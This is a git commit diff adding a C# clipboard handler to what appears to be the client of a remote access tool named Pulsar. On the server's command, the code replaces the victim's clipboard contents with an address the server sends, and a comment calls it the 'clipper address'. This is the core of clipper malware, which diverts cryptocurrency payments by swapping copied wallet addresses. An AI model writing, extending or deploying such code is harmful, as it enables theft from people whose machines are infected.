aa0bee7f130b5caf8fbe47fd7cf19cbd2f177303
Ho Jin Tao <Cyborg_Icarus@protonmail.com>
2025-08-16 12:50:36 +0700

    updated features

---
+++ Pulsar.Client/Messages/ClipboardHandler.cs
@@ -0,0 +1,57 @@
+﻿using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.Clipboard;
+using Pulsar.Common.Messages.Other;
+using Pulsar.Common.Messages.UserSupport.MessageBox;
+using Pulsar.Common.Networking;
+using System;
+using System.Threading;
+using System.Windows.Forms;
+using System.Collections.Generic;
+using System.Diagnostics;
+
+
+namespace Pulsar.Client.Messages
+{
+    public class ClipboardHandler : IMessageProcessor
+    {
+        // Do not use this for changing addresses, the clipper address might have changed (or the clipper may be off altogether).
+        public static List<string> _cachedAddresses = new List<string>(); 
+
+        public bool CanExecute(IMessage message) => message is DoSendAddress;
+
+        public bool CanExecuteFrom(ISender sender) => true;
+
+        public void Execute(ISender sender, IMessage message)
+        {
+            switch (message)
+            {
+                case DoSendAddress msg:
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoSendAddress message)
+        {
+            Thread clipboardThread = new Thread(() =>
+            {
+                Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
+                string clipperAddress = message.Address;
+                _cachedAddresses.Add(clipperAddress);
+                try
+                {
+                    Clipboard.SetText(clipperAddress);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine(ex.Message);
+                }
+                Application.DoEvents();
+            })
+            { IsBackground = true };
+            clipboardThread.SetApartmentState(ApartmentState.STA);
+            clipboardThread.Start();
+            clipboardThread.Join();
+        }
+    }
+}
